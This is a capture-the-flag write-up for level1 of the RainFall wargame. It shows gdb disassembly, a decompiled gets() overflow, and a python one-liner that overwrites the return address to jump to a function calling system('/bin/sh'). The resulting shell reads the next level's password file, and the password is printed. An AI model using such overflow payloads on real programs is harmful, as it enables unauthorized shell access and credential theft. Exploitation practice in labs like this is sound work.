## level1

```assembly
(gdb) disass main
Dump of assembler code for function main:
   0x08048480 <+0>:     push   ebp
   0x08048481 <+1>:     mov    ebp,esp
   0x08048483 <+3>:     and    esp,0xfffffff0
   0x08048486 <+6>:     sub    esp,0x50
   0x08048489 <+9>:     lea    eax,[esp+0x10]
   0x0804848d <+13>:    mov    DWORD PTR [esp],eax
   0x08048490 <+16>:    call   0x8048340 <gets@plt>
   0x08048495 <+21>:    leave  
   0x08048496 <+22>:    ret    
End of assembler dump.
```

```c
void run(void)
{
  fwrite("Good... Wait what?\n",1,0x13,stdout);
  system("/bin/sh");
  return;
}



void main(void)
{
  char local_50 [76];
  gets(local_50);
  return;
}
```

```
level1@RainFall:~$ (python -c 'print("w" * 76 + "\x44\x84\x04\x08")'; cat) | ./level1
Good... Wait what?
$ cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

Why jump to "\x44\x84\x04\x08" (in reverse)? (address of `run` function)
76 why????

```
Dump of assembler code for function main:
   0x08048480 <+0>:	push   ebp
   0x08048481 <+1>:	mov    ebp,esp
=> 0x08048483 <+3>:	and    esp,0xfffffff0
   0x08048486 <+6>:	sub    esp,0x50
   0x08048489 <+9>:	lea    eax,[esp+0x10]
   0x0804848d <+13>:	mov    DWORD PTR [esp],eax
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave  
   0x08048496 <+22>:	ret 
```

`0x08048444  run`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
python -c "print('\x90' * 60 + 'A' * 16 + '\x44\x84\x04\x08')" | ./level1
